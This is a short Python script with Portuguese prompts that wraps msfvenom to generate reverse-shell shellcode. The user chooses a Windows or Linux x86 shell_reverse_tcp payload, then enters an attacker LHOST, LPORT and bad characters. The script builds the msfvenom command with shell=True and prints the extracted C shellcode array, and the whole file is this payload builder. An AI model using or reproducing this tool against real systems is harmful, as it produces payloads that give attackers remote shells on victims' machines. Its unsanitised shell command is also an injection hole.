import subprocess

def criar_payload(tipo_payload, lhost, lport, badchars):
    comando = f"msfvenom -p {tipo_payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f c -b \"{badchars}\""
    processo = subprocess.Popen(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = processo.communicate()

    if error:
        print(f"Ocorreu um erro: {error.decode('utf-8')}")
    else:
        print(f"\nPayload gerado:\n{output.decode('utf-8')}")
        print("\nShellcode:")
        shellcode = extrair_shellcode(output.decode('utf-8'))
        print(shellcode)

def extrair_shellcode(output):
    linhas = output.split("\n")
    for linha in linhas:
        if linha.startswith("unsigned char"):
            return linha.split(" = ")[1].strip(";")

def main():
    print("Selecione o tipo de payload:")
    print("1. windows/shell_reverse_tcp")
    print("2. linux/x86/shell_reverse_tcp")
    tipo_payload = input("Opção: ")

    lhost = input("Digite o LHOST: ")
    lport = input("Digite o LPORT: ")
    badchars = input("Digite os badchars (no formato '\\x00\\x12\\x34...'): ")

    if tipo_payload == "1":
        tipo_payload = "windows/shell_reverse_tcp"
    elif tipo_payload == "2":
        tipo_payload = "linux/x86/shell_reverse_tcp"
    else:
        print("Opção inválida.")
        return

    criar_payload(tipo_payload, lhost, lport, badchars)

if __name__ == "__main__":
    main()
